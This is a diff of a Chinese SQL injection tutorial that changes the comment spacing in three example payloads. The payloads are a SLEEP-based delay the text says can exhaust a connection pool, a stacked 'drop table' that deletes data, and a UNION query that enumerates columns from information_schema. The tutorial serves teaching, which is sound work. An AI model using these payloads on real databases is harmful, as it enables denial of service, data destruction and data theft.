@@ -57,7 +57,7 @@ select ? from ? where ? Like '%'; -- %';
 紧紧抓住上一步中可以扩展的单引号部分。来一个简单的延时语句试一试:
 
 ```sql
-select ? from ? where ? Like '%Hammer' and 1 = SLEEP(2); --%';  
+select ? from ? where ? Like '%Hammer' and 1 = SLEEP(2); -- %';  
 ```
 
 这时查询会2秒后才返回结果，如果把时间延长，用脚本多点几次查询，一下就能把数据库的连接池用完。
@@ -65,7 +65,7 @@ select ? from ? where ? Like '%Hammer' and 1 = SLEEP(2); --%';
 当然，还有破坏力更强的！
 
 ```sql
-select ? from ? where ? Like '%Hammer'; drop table xxxx; --%'; 
+select ? from ? where ? Like '%Hammer'; drop table xxxx; -- %'; 
 ```
 
 可以直接把表/数据库直接删除掉，至于如何知道引数据库中有哪一些表(即如何确定上句SQL中的`xxxx`)呢？
@@ -108,7 +108,7 @@ select ? from ? where ? Like '%hammer' UNION (select TABLE_NAME,TABLE_SCHEMA,3,4
 看着列表一猜就能知道我们目前查的是products表，接下来我们再把products具体的字段也挖出来。
 
 ```sql
-select ? from ? where ? Like '%hammer' UNION (select COLUMN_NAME,TABLE_SCHEMA,3,4 from imformation_schema.columns where table_name = 'products'); --%';  
+select ? from ? where ? Like '%hammer' UNION (select COLUMN_NAME,TABLE_SCHEMA,3,4 from imformation_schema.columns where table_name = 'products'); -- %';  
 ```
 
 | 产品        | 价格    | 生产地   | 生产日期   |
